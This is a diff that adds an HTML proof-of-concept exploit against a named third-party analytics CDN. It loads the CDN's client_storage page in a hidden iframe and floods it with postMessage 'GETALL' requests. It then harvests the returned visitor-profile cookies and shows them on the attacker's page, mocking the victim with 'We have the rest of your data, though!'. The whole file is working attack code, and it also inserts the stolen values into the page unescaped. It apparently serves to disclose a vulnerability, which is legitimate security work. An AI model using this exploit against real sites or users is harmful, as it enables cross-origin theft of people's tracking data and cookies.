@@ -1,0 +1,62 @@
+<!doctype html>
+<html>
+<head>
+  <title>Proof of Concept</title>
+  <style>
+  iframe {
+    display: none;
+  }
+  </style>
+</head>
+<body>
+  <iframe id="victim-iframe"></iframe>
+  <div id='cookie'>Loading...</div>
+  <script>
+  var qs = {};
+  (location.search||"").replace("?","").split("&").forEach(p => {
+    [k,v] = p.split("=");
+    qs[k] = v;
+  })
+
+  var target_account = qs["target_account"] || 5935064;
+  var is_pci = qs["is_pci"];
+
+  var iframe_url = `https://a${target_account}.cdn${is_pci ? "-pci" : ""}.optimizely.com/client_storage/a10522694316.html`;
+
+  var interval;
+
+  window.addEventListener('message', function(e) {
+    var msg = JSON.parse(e.data);
+    if (msg.id === "foo") {
+      var html = "";
+      Object.entries(msg.response).forEach(([k,v]) => {
+        if (k.indexOf("$$visitor_profile") != -1) {
+          var {profile} = JSON.parse(v);
+          html += "<h2>"+k.split("_")[0]+" cookies:</h2>";
+          if (profile.cookies) {
+            html += "<ul>";
+              Object.entries(profile.cookies).forEach(([k,v]) => {
+                html += "<li><b>"+k+":</b> "+v+"</li>"
+              });
+            html += "</ul>";
+          } else {
+            html += "<p>It looks like they aren't using cookie tracking. We have the rest of your data, though!</p>";
+          }
+        }
+      });
+      if (html === "") {
+        html = "No data found. Either this account doesn't have cross-origin tracking configured, or you haven't visited any of their sites.";
+      }
+      document.getElementById("cookie").innerHTML = html;
+      clearInterval(interval);
+    }
+  })
+
+var vframe = document.getElementById("victim-iframe");
+vframe.src = iframe_url;
+var interval = setInterval(function() {
+  vframe.contentWindow.postMessage(JSON.stringify({type:"GETALL", id:"foo"}), "*");
+}, 10);
+  </script>
+</body>
+</html>
